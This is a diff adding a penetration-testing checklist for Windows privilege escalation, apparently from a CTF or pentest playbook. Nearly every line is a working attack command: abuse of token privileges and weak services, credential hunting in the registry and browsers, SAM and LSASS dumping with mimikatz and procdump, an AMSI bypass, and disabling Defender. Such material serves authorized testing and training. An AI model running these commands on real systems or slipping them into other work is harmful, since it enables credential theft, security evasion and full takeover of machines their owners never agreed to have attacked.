@@ -1,0 +1,80 @@
+# 05 — Windows Privilege Escalation
+
+Trigger: any shell on a Windows host.
+Reference: [Windows Privilege Escalation](../4-post-exploitation/02-windows-privilege-escalation.md) · [Credential Dumping](../4-post-exploitation/03-credential-dumping.md).
+
+## First 5 minutes on any Windows shell
+
+- [ ] Identify yourself: `whoami; whoami /priv; whoami /groups; hostname`.
+- [ ] OS + patch level: `systeminfo`. Note `OS Version` and installed hotfixes.
+- [ ] Domain-joined? `systeminfo | findstr /B "Domain"`. If `WORKGROUP`, skip AD attacks.
+- [ ] Users: `net user`; groups: `net localgroup`; admins: `net localgroup administrators`.
+- [ ] Screenshot `whoami /all` for the report.
+
+## Run the automated tools first
+
+- [ ] Upload and run **winPEAS**: `winpeas.exe > lp.txt` (or the `.bat` if `.exe` is blocked).
+- [ ] Alternative — `PowerUp.ps1` from PowerSploit: `. .\PowerUp.ps1; Invoke-AllChecks`.
+- [ ] Alternative — `Seatbelt.exe` for host recon.
+
+## Token privileges (check `whoami /priv` first — this is the fastest win)
+
+Any of these = instant local admin/SYSTEM:
+
+- [ ] `SeImpersonatePrivilege` → **PrintSpoofer** / **JuicyPotatoNG** / **GodPotato** → SYSTEM.
+- [ ] `SeAssignPrimaryToken` → RoguePotato / PrintSpoofer.
+- [ ] `SeBackupPrivilege` → read `SAM` / `SYSTEM` hives → dump hashes offline with `secretsdump`.
+- [ ] `SeRestorePrivilege` → overwrite `utilman.exe` with `cmd.exe` → boot to SYSTEM shell.
+- [ ] `SeTakeOwnershipPrivilege` → same, via `takeown`.
+- [ ] `SeDebugPrivilege` → inject into a SYSTEM process.
+- [ ] `SeManageVolumePrivilege` → arbitrary file write as SYSTEM.
+- [ ] `SeTcbPrivilege` → act as part of the OS → SYSTEM.
+
+## Service misconfigurations
+
+- [ ] Unquoted service paths: `wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\"`. If path has spaces + no quotes → drop a binary.
+- [ ] Weak service permissions: `accesschk.exe /accepteula -uwcqv <user> *` — writable SCM entry = win.
+- [ ] Service binary writable but not the SCM entry? Replace the binary → restart the service.
+- [ ] `sc qc <service>` — check `SERVICE_START_NAME`. If it runs as `LocalSystem` and you can start/stop it, replace the exe.
+- [ ] AlwaysInstallElevated: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` — if both HKCU + HKLM are 1, `msiexec /quiet /qn /i evil.msi` → SYSTEM.
+
+## Credential hunting
+
+- [ ] Registry autorun creds: `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword`.
+- [ ] Unattend files: `dir /s /b unattend.xml sysprep.xml autounattend.xml 2>nul`.
+- [ ] PowerShell history: `type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.
+- [ ] Saved RDP creds: `cmdkey /list`; use with `runas /savecred /user:<user> cmd.exe`.
+- [ ] Chrome / Edge / Firefox saved passwords — `SharpChrome`, `SharpDPAPI`.
+- [ ] KeePass `.kdbx` files anywhere on disk.
+- [ ] Browser tokens for cloud consoles.
+- [ ] GPP `cpassword` in `\\<dc>\SYSVOL\<domain>\Policies\` (LDAP/SMB, not local — but worth checking).
+
+## Dumping hashes (once you have local admin)
+
+- [ ] `reg save HKLM\SAM sam.save; reg save HKLM\SYSTEM system.save; reg save HKLM\SECURITY security.save` → exfil → `impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL`.
+- [ ] LSASS dump: `procdump -accepteula -ma lsass.exe lsass.dmp` → `pypykatz lsa minidump lsass.dmp`.
+- [ ] `mimikatz.exe` — `privilege::debug; sekurlsa::logonpasswords; lsadump::sam`.
+- [ ] `nxc smb <ip> -u <admin> -p <pass> --sam --lsa --dpapi` from a remote host if you have creds.
+
+## Kernel exploits (last resort)
+
+- [ ] `systeminfo` → paste into [Watson](https://github.com/rasta-mouse/Watson) or `windows-exploit-suggester`.
+- [ ] Common wins: **MS17-010** (EternalBlue), **MS16-032**, **MS15-051**, **CVE-2021-1732**.
+- [ ] Only do this if nothing else works — kernel exploits crash boxes.
+
+## AV / Defender bypass gotchas
+
+- [ ] Payload flagged? Try obfuscation: `Invoke-Obfuscation`, or roll your own with `msfvenom --encoder`.
+- [ ] AMSI kills PowerShell? `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` (patched in recent versions — have 3 bypasses ready).
+- [ ] Constrained language mode? Use `.NET` reflection or drop to `cmd.exe`.
+- [ ] Disable Defender if you're admin: `Set-MpPreference -DisableRealtimeMonitoring $true`.
+
+## Once SYSTEM / admin
+
+- [ ] `type C:\Users\Administrator\Desktop\root.txt` (or wherever).
+- [ ] Screenshot: `whoami && hostname && type flag.txt`.
+- [ ] Dump SAM + LSA + LSASS — every hash to feed cracker and Pass-the-Hash.
+- [ ] Search all user profiles for creds/notes.
+- [ ] Check for domain admin sessions — logged-on users (`qwinsta`, `tasklist /v /fi "username eq domain\\*"`).
+- [ ] Check trust relationships to other domains.
+- [ ] Now: [07-pivoting.md](./07-pivoting.md) if another subnet is reachable.
